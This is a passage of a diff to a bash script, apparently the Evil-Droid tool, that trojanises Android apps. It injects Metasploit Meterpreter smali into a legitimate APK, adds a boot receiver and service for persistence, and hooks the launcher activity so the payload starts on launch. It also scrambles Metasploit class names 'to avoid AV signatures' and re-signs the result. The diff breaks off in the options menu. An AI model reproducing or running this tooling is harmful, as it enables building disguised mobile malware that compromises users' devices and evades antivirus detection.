+        app_name=$(grep "<application" "$path/original/AndroidManifest.xml" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g' | sed 's%/[^/]*$%%') 2>&1
+        app_dash=$(grep "<application" "$path/original/AndroidManifest.xml" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g' | sed 's|/|.|g' | sed 's%.[^.]*$%%') 2>&1
+        tmp=$app_name
+        sed -i "s|L$package_name|L$app_name|g" "$path/payload/smali/com/metasploit/stage/"*.smali 2>&1
+        cp -r "$path/payload/smali/com/metasploit/stage" "$path/original/smali/$app_name" > /dev/null 2>&1
+        amanifest="    </application>"
+        boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
+        sed -i "s|$amanifest|$boot_cmp|g" "$path/original/AndroidManifest.xml" 2>&1    
+    fi
+    amanifest="    </application>"
+    boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
+    sed -i "s|$amanifest|$boot_cmp|g" "$path/original/AndroidManifest.xml" 2>&1    
+    android_nam=$tmp
 }
+
 # functions hook smali
 function hook_smalies()
 {
- launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
- android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- if [ $android_name ]; then
-  echo
-  echo "##################################################################"
-  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
-  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  echo "In line:$hook_num"
-  echo "##################################################################"
-  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
-  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
- elif [ ! -e $android_activity ]; then
-  echo
-  echo "##################################################################"
-  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
-  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  echo "In line:$hook_num"
-  echo "##################################################################"
-  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
-  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
-  rc=$?
-  if [ $rc != 0 ]; then
-    spinlong
-    echo -e $red ""
-    echo "[x] cant find : $android_activity.smali"
-    echo "[*] try another ..."
-    spinlong
-    sleep 2
-    echo
-    echo "##################################################################"
-    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
-    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-    echo "In line:$hook_num"
-    echo "##################################################################"
-    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
-    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
-  fi 
- fi
+    launcher_line_num=$(grep -n "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | awk -F ":" 'NR==1{ print $1 }') 2>&1
+    android_name=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<application" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g') 2>&1
+    android_activity=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<activity" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g') 2>&1
+    android_targetActivity=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<activity" | grep -m1 "" | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g') 2>&1
+    
+    if [ -n "$android_name" ]; then
+        echo
+        echo "##################################################################"
+        echo "inject Smali: $android_name.smali" | awk -F ":/" '{ print $NF }'
+        hook_num=$(grep -n "    return-void" "$path/original/smali/$android_name.smali" 2>&1 | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }') 2>&1
+        echo "In line:$hook_num"
+        echo "##################################################################"
+        starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+        sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_name.smali" > /dev/null 2>&1
+    elif [ ! -e "$android_activity" ]; then
+        echo
+        echo "##################################################################"
+        echo "inject Smali: $android_activity.smali" | awk -F ":/" '{ print $NF }'
+        hook_num=$(grep -n "    return-void" "$path/original/smali/$android_activity.smali" 2>&1 | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }') 2>&1
+        echo "In line:$hook_num"
+        echo "##################################################################"
+        starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+        sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_activity.smali" > /dev/null 2>&1
+        rc=$?
+        if [ $rc != 0 ]; then
+            spinlong
+            echo -e $red ""
+            echo "[x] cant find : $android_activity.smali"
+            echo "[*] try another ..."
+            spinlong
+            sleep 2
+            echo
+            echo "##################################################################"
+            echo "inject Smali: $android_targetActivity.smali" | awk -F ":/" '{ print $NF }'
+            hook_num=$(grep -n "    return-void" "$path/original/smali/$android_targetActivity.smali" 2>&1 | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }') 2>&1
+            echo "In line:$hook_num"
+            echo "##################################################################"
+            starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+            sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_targetActivity.smali" > /dev/null 2>&1
+        fi 
+    fi
 }
+
 #function flagged by av & updating smalies
 function flagg()
 {
- echo -e $yellow ""
- echo "[*] Scrubbing the payload contents to avoid AV signatures..."
- spinlong
- mv payload/smali/com/metasploit payload/smali/com/$VAR1
- mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
- mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
- sleep 2
- if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
-    echo
-    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
-    apache_svc_stop
-    postgresql_stop
-    exit 1
- fi
- sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
- sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
- sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
- sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
- sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
- sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
- sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
- sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
- sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
+    echo -e $yellow ""
+    echo "[*] Scrubbing the payload contents to avoid AV signatures..."
+    spinlong
+    mv payload/smali/com/metasploit payload/smali/com/"$VAR1"
+    mv payload/smali/com/"$VAR1"/stage payload/smali/com/"$VAR1"/"$VAR2"
+    mv payload/smali/com/"$VAR1"/"$VAR2"/Payload.smali payload/smali/com/"$VAR1"/"$VAR2"/"$VAR3".smali
+    sleep 2
+    if [ -f payload/smali/com/"$VAR1"/"$VAR2"/PayloadTrustManager.smali ]; then
+        echo
+        echo -e $red "[ X ] an error was occurred. Please upgrade your distro .."
+        apache_svc_stop
+        postgresql_stop
+        exit 1
+    fi
+    sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/"$VAR1"/"$VAR2"/*
+    sed -i "s#Payload#$VAR3#g" payload/smali/com/"$VAR1"/"$VAR2"/*
+    sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/"$VAR1"/"$VAR2"/"$VAR3".smali
+    sed -i "s#payload#$VAR7#g" payload/smali/com/"$VAR1"/"$VAR2"/"$VAR3".smali
+    sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
+    sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
+    sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
+    sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
+    sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
 }
+
 function flagg_original()
 {
- echo -e $yellow ""
- echo "[*] Scrubbing the payload contents to avoid AV signatures..."
- spinlong
- rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
- mv payload/smali/com/metasploit/stage payload/smali/com/metasploit/$VAR1
- mv payload/smali/com/metasploit/$VAR1/MainBroadcastReceiver.smali payload/smali/com/metasploit/$VAR1/$VAR2.smali
- mv payload/smali/com/metasploit/$VAR1/MainService.smali payload/smali/com/metasploit/$VAR1/$VAR3.smali
- mv payload/smali/com/metasploit/$VAR1/Payload.smali payload/smali/com/metasploit/$VAR1/$VAR4.smali
- sleep 2
- if [ -f payload/smali/com/metasploit/$VAR1/PayloadTrustManager.smali ]; then
-    echo
-    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
-    apache_svc_stop
-    postgresql_stop
-    exit 1
- fi
- echo -e $yellow ""
- echo "[*] Adding permission and Hook Smali"
- spinlong
- sed -i "5i\ $perms" $path/original/AndroidManifest.xml
- package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
- package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
- tmp=$package_name
- sed -i "s|Lcom/metasploit/stage|L$package_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- sed -i "s|L$package_name/$VAR1/Payload|L$package_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- sed -i "s|L$package_name/$VAR1/MainService|L$package_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- sed -i "s|L$package_name/$VAR1/MainBroadcastReceiver|L$package_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$package_name > /dev/null 2>&1
- rc=$?
- if [ $rc != 0 ];then
-  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
-  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
-  tmp=$app_name
-  sed -i "s|L$package_name/$VAR1|L$app_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  sed -i "s|L$app_name/$VAR1/$VAR4|L$app_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  sed -i "s|L$app_name/$VAR1/$VAR3|L$app_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  sed -i "s|L$app_name/$VAR1/$VAR2|L$app_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$app_name > /dev/null 2>&1
-  amanifest="    </application>"
-  boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$app_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.$VAR1.$VAR3'"/></application>'
-  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
- fi
- amanifest="    </application>"
- boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$package_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.$VAR1.$VAR3'"/></application>'
- sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
- android_nam=$tmp
- launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
- android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
-  if [ $android_name ]; then
-  echo
-  echo "##################################################################"
-  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
-  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  echo "In line:$hook_num"
-  echo "##################################################################"
-  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
-  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
- elif [ ! -e $android_activity ]; then
-  echo
-  echo "##################################################################"
-  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
-  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  echo "In line:$hook_num"
-  echo "##################################################################"
-  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
-  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
-  rc=$?
-  if [ $rc != 0 ]; then
+    echo -e $yellow ""
+    echo "[*] Scrubbing the payload contents to avoid AV signatures..."
     spinlong
-    echo -e $red ""
-    echo "[x] cant find : $android_activity.smali"
-    echo "[*] try another ..."
-    spinlong
+    rm -f "$path/payload/smali/com/metasploit/stage/MainActivity.smali" 2>&1
+    mv payload/smali/com/metasploit/stage payload/smali/com/metasploit/"$VAR1"
+    mv payload/smali/com/metasploit/"$VAR1"/MainBroadcastReceiver.smali payload/smali/com/metasploit/"$VAR1"/"$VAR2".smali
+    mv payload/smali/com/metasploit/"$VAR1"/MainService.smali payload/smali/com/metasploit/"$VAR1"/"$VAR3".smali
+    mv payload/smali/com/metasploit/"$VAR1"/Payload.smali payload/smali/com/metasploit/"$VAR1"/"$VAR4".smali
     sleep 2
-    echo
-    echo "##################################################################"
-    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
-    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-    echo "In line:$hook_num"
-    echo "##################################################################"
-    starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
-    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
-  fi
- fi
+    if [ -f payload/smali/com/metasploit/"$VAR1"/PayloadTrustManager.smali ]; then
+        echo
+        echo -e $red "[ X ] an error was occurred. Please upgrade your distro .."
+        apache_svc_stop
+        postgresql_stop
+        exit 1
+    fi
+    echo -e $yellow ""
+    echo "[*] Adding permission and Hook Smali"
+    spinlong
+    sed -i "5i\\ $perms" "$path/original/AndroidManifest.xml"
+    package_name=$(head -n 2 "$path/original/AndroidManifest.xml" | grep "<manifest" | grep -o -P 'package="[^\"]+"' | sed 's/\"//g' | sed 's/package=//g' | sed 's/\./\//g') 2>&1
+    package_dash=$(head -n 2 "$path/original/AndroidManifest.xml" | grep "<manifest" | grep -o -P 'package="[^\"]+"' | sed 's/\"//g' | sed 's/package=//g' | sed 's/\./\//g' | sed 's|/|.|g') 2>&1
+    tmp=$package_name
+    sed -i "s|Lcom/metasploit/stage|L$package_name/$VAR1|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+    sed -i "s|L$package_name/$VAR1/Payload|L$package_name/$VAR1/$VAR4|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+    sed -i "s|L$package_name/$VAR1/MainService|L$package_name/$VAR1/$VAR3|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+    sed -i "s|L$package_name/$VAR1/MainBroadcastReceiver|L$package_name/$VAR1/$VAR2|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+    cp -r "$path/payload/smali/com/metasploit/$VAR1" "$path/original/smali/$package_name" > /dev/null 2>&1
+    rc=$?
+    if [ $rc != 0 ]; then
+        app_name=$(grep "<application" "$path/original/AndroidManifest.xml" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g' | sed 's%/[^/]*$%%') 2>&1
+        app_dash=$(grep "<application" "$path/original/AndroidManifest.xml" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g' | sed 's|/|.|g' | sed 's%.[^.]*$%%') 2>&1
+        tmp=$app_name
+        sed -i "s|L$package_name/$VAR1|L$app_name/$VAR1|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+        sed -i "s|L$app_name/$VAR1/$VAR4|L$app_name/$VAR1/$VAR4|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+        sed -i "s|L$app_name/$VAR1/$VAR3|L$app_name/$VAR1/$VAR3|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+        sed -i "s|L$app_name/$VAR1/$VAR2|L$app_name/$VAR1/$VAR2|g" "$path/payload/smali/com/metasploit/$VAR1/"*.smali 2>&1
+        cp -r "$path/payload/smali/com/metasploit/$VAR1" "$path/original/smali/$app_name" > /dev/null 2>&1
+        amanifest="    </application>"
+        boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$app_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.$VAR1.$VAR3'"/></application>'
+        sed -i "s|$amanifest|$boot_cmp|g" "$path/original/AndroidManifest.xml" 2>&1
+    fi
+    amanifest="    </application>"
+    boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$package_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.$VAR1.$VAR3'"/></application>'
+    sed -i "s|$amanifest|$boot_cmp|g" "$path/original/AndroidManifest.xml" 2>&1
+    android_nam=$tmp
+    launcher_line_num=$(grep -n "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | awk -F ":" 'NR==1{ print $1 }') 2>&1
+    android_name=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<application" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g') 2>&1
+    android_activity=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<activity" | tail -1 | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g') 2>&1
+    android_targetActivity=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<activity" | grep -m1 "" | grep -o -P 'android:name="[^\"]+"' | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g') 2>&1
+    
+    if [ -n "$android_name" ]; then
+        echo
+        echo "##################################################################"
+        echo "inject Smali: $android_name.smali" | awk -F ":/" '{ print $NF }'
+        hook_num=$(grep -n "    return-void" "$path/original/smali/$android_name.smali" 2>&1 | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }') 2>&1
+        echo "In line:$hook_num"
+        echo "##################################################################"
+        starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
+        sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_name.smali" > /dev/null 2>&1
+    elif [ ! -e "$android_activity" ]; then
+        echo
+        echo "##################################################################"
+        echo "inject Smali: $android_activity.smali" | awk -F ":/" '{ print $NF }'
+        hook_num=$(grep -n "    return-void" "$path/original/smali/$android_activity.smali" 2>&1 | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }') 2>&1
+        echo "In line:$hook_num"
+        echo "##################################################################"
+        starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
+        sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_activity.smali" > /dev/null 2>&1
+        rc=$?
+        if [ $rc != 0 ]; then
+            spinlong
+            echo -e $red ""
+            echo "[x] cant find : $android_activity.smali"
+            echo "[*] try another ..."
+            spinlong
+            sleep 2
+            echo
+            echo "##################################################################"
+            echo "inject Smali: $android_targetActivity.smali" | awk -F ":/" '{ print $NF }'
+            hook_num=$(grep -n "    return-void" "$path/original/smali/$android_targetActivity.smali" 2>&1 | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }') 2>&1
+            echo "In line:$hook_num"
+            echo "##################################################################"
+            starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
+            sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_targetActivity.smali" > /dev/null 2>&1
+        fi
+    fi
 }
-# function chage name and icon
+
+# function change name and icon
 function merge_name_ico()
 {
- echo -e $yellow ""
- echo "[*] Changing name and icon payload..."
- spinlong
- label='    <application android:label="@string/app_name">'
- label1='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
- sed -i "s|$label|$label1|g" $path/payload/AndroidManifest.xml 2>&1
- sed -i "s|MainActivity|$apk_name|g" $path/payload/res/values/strings.xml 2>&1
- mkdir $path/payload/res/drawable
- cp $iconos $path/payload/res/drawable/main_icon.png
+    echo -e $yellow ""
+    echo "[*] Changing name and icon payload..."
+    spinlong
+    label='    <application android:label="@string/app_name">'
+    label1='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
+    sed -i "s|$label|$label1|g" "$path/payload/AndroidManifest.xml" 2>&1
+    sed -i "s|MainActivity|$apk_name|g" "$path/payload/res/values/strings.xml" 2>&1
+    mkdir -p "$path/payload/res/drawable"
+    cp "$iconos" "$path/payload/res/drawable/main_icon.png"
 }
-#function signing apk
+
+#function signing apk - Enhanced with better error handling
 function sign()
 {
- echo -e $yellow ""
- echo "[*] Checking for ~/.android/debug.keystore for signing..."
- spinlong
- if [ ! -f ~/.android/debug.keystore ]; then
-     echo -e $red ""
-     echo " [ X ] Debug key not found. Generating one now..."
-     spinlong
-     if [ ! -d "~/.android" ]; then
-       mkdir ~/.android > /dev/null 2>&1
-     fi
-     echo -e $lightgreen ""
-     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
- fi
- spinlong
- echo -e $yellow ""
- echo "[*] Attempting to sign the package with your android debug key"
- spinlong
- jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA evil.apk androiddebugkey > /dev/null 2>&1
- echo -e $yellow 
- echo "[*] Verifying signed artifacts..."
- spinlong
- jarsigner -verify -certs evil.apk > /dev/null 2>&1
- rc=$?
- if [ $rc != 0 ]; then
-   echo -e $red ""
-   echo "[!] Failed to verify signed artifacts"
-   apache_svc_stop
-   postgresql_stop
-   exit $rc
- fi
- echo -e $yellow
- echo "[*] Aligning recompiled APK..."
- spinlong
- zipalign 4 evil.apk $apk_name.apk 2>&1
- rc=$?
- echo -e $yellow
- echo "[✔] Done."
- spinlong
- if [ $rc != 0 ]; then
-   echo -e $red ""
-   echo "[!] Failed to align recompiled APK"
-   apache_svc_stop
-   postgresql_stop
-   exit $rc
- fi
- rm evil.apk > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Checking for ~/.android/debug.keystore for signing..."
+    spinlong
+
+    if [ ! -f ~/.android/debug.keystore ]; then
+        echo -e $red ""
+        echo " [ X ] Debug key not found. Generating one now..."
+        spinlong
+        mkdir -p ~/.android > /dev/null 2>&1
+        if ! keytool -genkey -v -keystore ~/.android/debug.keystore \
+            -storepass android -alias androiddebugkey -keypass android \
+            -keyalg RSA -keysize 2048 -validity 10000 \
+            -dname "CN=Android Debug,O=Android,C=US" > /dev/null 2>&1; then
+            echo -e $red "[ ✗ ] Failed to generate debug keystore"
+            return 1
+        fi
+        echo -e $green "[ ✔ ] Debug keystore generated successfully"
+    fi
+
+    echo -e $yellow
+    echo "[*] Aligning recompiled APK..."
+    spinlong
+    if ! zipalign -v -p 4 evil.apk aligned.apk > /dev/null 2>&1; then
+        echo -e $red ""
+        echo "[!] Failed to align recompiled APK"
+        apache_svc_stop
+        postgresql_stop
+        exit 1
+    fi
+    echo -e $green "[ ✔ ] APK aligned successfully"
+
+    echo -e $yellow
+    echo "[*] Signing APK using apksigner..."
+    spinlong
+    if ! apksigner sign --ks ~/.android/debug.keystore --ks-key-alias androiddebugkey \
+        --ks-pass pass:android --key-pass pass:android --out "$apk_name.apk" aligned.apk > /dev/null 2>&1; then
+        echo -e $red ""
+        echo "[!] Failed to sign APK"
+        apache_svc_stop
+        postgresql_stop
+        exit 1
+    fi
+    echo -e $green "[ ✔ ] APK signed successfully"
+
+    echo -e $yellow
+    echo "[*] Verifying APK signature..."
+    spinlong
+    if ! apksigner verify "$apk_name.apk" > /dev/null 2>&1; then
+        echo -e $red ""
+        echo "[!] Failed to verify signed artifacts"
+        apache_svc_stop
+        postgresql_stop
+        exit 1
+    fi
+
+    rm -f evil.apk aligned.apk > /dev/null 2>&1
+    echo -e $green "[✔] APK signed and verified successfully"
 }
+
 #function ask
 function quests()
 {
-while true; do
-   echo ""
-   quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
-   case $quest in
-   APK-MSF) change_icon;spinlong;gen_payload;spinlong;apk_decomp;flagg;merge_name_ico;spinlong;apk_comp;spinlong;sign;return;;
